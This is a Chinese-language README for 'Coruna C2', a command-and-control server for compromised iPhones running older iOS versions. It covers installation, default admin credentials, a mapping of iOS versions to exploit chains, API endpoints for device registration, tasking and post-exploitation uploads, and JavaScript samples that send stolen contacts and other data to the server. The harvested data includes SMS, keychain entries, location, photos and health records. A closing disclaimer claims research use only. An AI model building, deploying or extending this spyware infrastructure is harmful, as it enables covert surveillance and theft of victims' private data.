# Coruna C2 后端管理系统

完整的 iOS Exploit Toolkit (Coruna) 后端管理系统，支持设备管理、任务调度、数据外泄收集和实时监控。

## 📋 功能特性

### 核心功能
- **设备管理**: 设备注册、心跳检测、状态监控、位置追踪
- **任务调度**: 创建任务、批量任务、任务状态跟踪、结果收集
- **数据外泄**: 支持多种数据类型上传、文件存储、预览和下载
- **实时通信**: WebSocket 实时推送设备状态、日志和任务结果
- **后渗透数据收集**: 联系人、短信、通话记录、钥匙串、照片等
- **管理面板**: Web 界面进行设备、任务和数据管理

### 支持的数据类型
- 联系人 (Contacts)
- 短信 (SMS)
- 通话记录 (Call Logs)
- 钥匙串 (Keychain)
- 照片 (Photos)
- 应用列表 (Apps)
- 进程列表 (Processes)
- WiFi 网络 (WiFi Networks)
- 浏览器历史 (Browser History)
- 日历事件 (Calendar Events)
- 笔记 (Notes)
- 健康数据 (Health Data)
- 剪贴板 (Clipboard)

## 🚀 快速开始

### 环境要求
- Python 3.8+
- SQLite3
- 现代浏览器（用于管理面板）

### 安装步骤

1. **克隆或下载项目**
```bash
cd coruna-针对ios17以下老版本
```

2. **安装依赖**

Windows:
```bash
start.bat
```

Linux/Mac:
```bash
chmod +x start.sh
./start.sh
```

手动安装:
```bash
cd backend
python -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate
pip install -r requirements.txt
```

3. **启动服务器**

Windows:
```bash
start.bat
```

Linux/Mac:
```bash
./start.sh
```

手动启动:
```bash
cd backend
source venv/bin/activate
uvicorn main:app --host 0.0.0.0 --port 8782 --reload
```

4. **访问管理面板**

打开浏览器访问: `http://localhost:8782`

默认登录凭据:
- 用户名: `admin`
- 密码: `admin123`

⚠️ **重要**: 首次使用后请修改默认密码！

## 📁 项目结构

```
coruna-针对ios17以下老版本/
├── backend/                    # 后端代码
│   ├── __init__.py
│   ├── main.py                # FastAPI 主应用
│   ├── config.py              # 配置管理
│   ├── database.py            # 数据库连接
│   ├── models.py              # 数据库模型
│   ├── schemas.py             # Pydantic 数据模型
│   ├── crud.py                # 数据库操作
│   ├── requirements.txt       # Python 依赖
│   └── api/                   # API 路由
│       ├── __init__.py
│       ├── devices.py         # 设备管理 API
│       ├── tasks.py           # 任务管理 API
│       ├── upload.py          # 数据上传 API
│       ├── postexploit.py     # 后渗透数据 API
│       ├── admin.py           # 管理员 API
│       └── websocket.py       # WebSocket 通信
├── frontend/                   # 前端代码
│   ├── admin.html             # 管理面板 HTML
│   └── static/admin/          # 静态资源
│       ├── css/
│       │   └── style.css      # 样式文件
│       └── js/
│           └── app.js         # 前端逻辑
├── data/                       # 数据目录
│   ├── exfil/                 # 外泄文件存储
│   ├── logs/                  # 日志文件
│   └── payloads/              # Payload 文件
├── start.sh                    # Linux/Mac 启动脚本
└── start.bat                   # Windows 启动脚本
```

## 🔧 配置说明

配置文件位于 `backend/config.py`，主要配置项:

```python
# 服务器配置
HOST = "0.0.0.0"
PORT = 8782

# 数据库配置
DATABASE_URL = "sqlite:///coruna_c2.db"

# 管理员配置
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"
SECRET_KEY = "your-secret-key-here"

# Coruna 配置
CORUNA_SERVER_URL = "http://localhost:8782"
SUPPORTED_IOS_VERSIONS = {
    "13.0": "buffout",
    "13.0-14.x": "breezy",
    # ... 更多版本
}

# 任务配置
TASK_TIMEOUT = 300
HEARTBEAT_INTERVAL = 30
```

## 📡 API 端点

### 设备管理
- `POST /api/devices/register` - 设备注册
- `POST /api/devices/heartbeat` - 设备心跳
- `GET /api/devices` - 获取设备列表
- `GET /api/devices/{device_uuid}` - 获取设备详情
- `DELETE /api/devices/{device_uuid}` - 删除设备

### 任务管理
- `POST /api/tasks/create` - 创建任务
- `POST /api/tasks/create/batch` - 批量创建任务
- `GET /api/tasks/poll/{device_uuid}` - 设备轮询任务
- `POST /api/tasks/result` - 提交任务结果
- `GET /api/tasks` - 获取任务列表

### 数据上传
- `POST /api/upload` - 通用数据上传
- `POST /api/upload/file` - 文件上传
- `GET /api/upload/list` - 获取外泄数据列表
- `GET /api/upload/download/{exfil_id}` - 下载文件

### 后渗透数据
- `POST /api/postexploit/contacts` - 上传联系人
- `POST /api/postexploit/sms` - 上传短信
- `POST /api/postexploit/calls` - 上传通话记录
- `POST /api/postexploit/keychain` - 上传钥匙串
- `POST /api/postexploit/photos` - 上传照片
- `POST /api/postexploit/apps` - 上传应用列表
- `POST /api/postexploit/wifi` - 上传 WiFi 网络
- `POST /api/postexploit/browser_history` - 上传浏览器历史

### 管理员
- `POST /api/admin/login` - 管理员登录
- `GET /api/admin/stats` - 获取统计数据
- `GET /api/admin/devices` - 获取所有设备
- `GET /api/admin/tasks` - 获取所有任务
- `GET /api/admin/exfil` - 获取所有外泄数据

### WebSocket
- `WS /ws/device/{device_uuid}` - 设备 WebSocket 连接
- `WS /ws/admin` - 管理员 WebSocket 连接

## 🔐 安全建议

1. **修改默认密码**: 首次使用后立即修改管理员密码
2. **使用 HTTPS**: 生产环境建议使用 HTTPS
3. **限制访问**: 使用防火墙限制服务器访问
4. **定期备份**: 定期备份数据库和外泄数据
5. **日志监控**: 监控服务器日志，及时发现异常
6. **更新依赖**: 定期更新 Python 依赖包

## 📊 数据库结构

系统使用 SQLite 数据库，包含以下主要表:

- `devices` - 设备信息
- `tasks` - 任务信息
- `exfil` - 外泄数据记录
- `device_logs` - 设备日志
- `contact_records` - 联系人记录
- `sms_records` - 短信记录
- `call_records` - 通话记录
- `keychain_records` - 钥匙串记录
- `photo_records` - 照片记录
- `app_records` - 应用记录
- `process_records` - 进程记录
- `wifi_records` - WiFi 记录
- `browser_history_records` - 浏览器历史记录
- `calendar_events` - 日历事件
- `note_records` - 笔记记录
- `health_records` - 健康数据记录
- `clipboard_records` - 剪贴板记录

## 🛠️ 开发说明

### 添加新的 API 端点

1. 在 `backend/api/` 目录下创建新的路由文件
2. 定义 FastAPI 路由和端点
3. 在 `backend/api/__init__.py` 中导入
4. 在 `backend/main.py` 中注册路由

### 添加新的数据类型

1. 在 `backend/models.py` 中定义数据库模型
2. 在 `backend/schemas.py` 中定义 Pydantic 模型
3. 在 `backend/crud.py` 中添加 CRUD 操作
4. 在 `backend/api/postexploit.py` 中添加 API 端点

### 前端开发

前端使用原生 JavaScript，主要文件:
- `frontend/admin.html` - HTML 结构
- `frontend/static/admin/css/style.css` - 样式
- `frontend/static/admin/js/app.js` - 逻辑

## 📝 使用示例

### 设备注册

```javascript
const deviceData = {
    device_uuid: "unique-device-id",
    device_model: "iPhone 12",
    ios_version: "14.5",
    exploit_stage: "webkit_exploit",
    latitude: 39.9042,
    longitude: 116.4074
};

fetch('/api/devices/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(deviceData)
});
```

### 创建任务

```javascript
const taskData = {
    device_uuid: "unique-device-id",
    task_type: "screenshot",
    payload: "",
    priority: 1
};

fetch('/api/tasks/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(taskData)
});
```

### 上传数据

```javascript
const formData = new FormData();
formData.append('device_uuid', 'unique-device-id');
formData.append('category', 'contact');
formData.append('content', base64EncodedData);

fetch('/api/upload', {
    method: 'POST',
    body: formData
});
```

## 🐛 故障排除

### 服务器无法启动
- 检查端口 8782 是否被占用
- 确认 Python 版本 >= 3.8
- 检查依赖是否正确安装

### 无法连接 WebSocket
- 检查防火墙设置
- 确认 WebSocket 端点地址正确
- 查看浏览器控制台错误信息

### 数据库错误
- 检查数据库文件权限
- 确认 SQLite3 正确安装
- 查看服务器日志

## 📄 许可证

本项目仅供学习和研究使用。

## ⚠️ 免责声明

本工具仅用于安全研究和教育目的。使用者需自行承担使用本工具所产生的所有法律责任。开发者不对任何滥用行为负责。